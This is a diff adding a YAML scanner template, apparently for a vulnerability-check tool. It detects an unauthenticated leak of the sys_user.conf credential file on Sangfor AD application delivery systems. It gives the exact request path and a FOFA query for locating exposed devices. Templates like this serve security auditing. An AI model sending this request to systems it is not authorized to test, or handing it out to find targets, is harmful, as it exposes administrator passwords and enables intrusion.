@@ -1,0 +1,18 @@
+id: sangfor-ad-infoleak
+
+info:
+  name: Sangfor AD 应用交付管理系统 sys_user.conf 信息泄露
+  author: qwtd
+  severity: medium
+  verified: true
+  description: |
+    FOFA: app="SANGFOR-应用交付管理系统"
+    深信服 应用交付管理系统 文件sys_user.conf可在未授权的情况下直接访问，导致账号密码泄漏。
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /tmp/updateme/sinfor/ad/sys/sys_user.conf
+    expression: response.status == 200 && response.body.bcontains(b'admin')
+expression: r0()
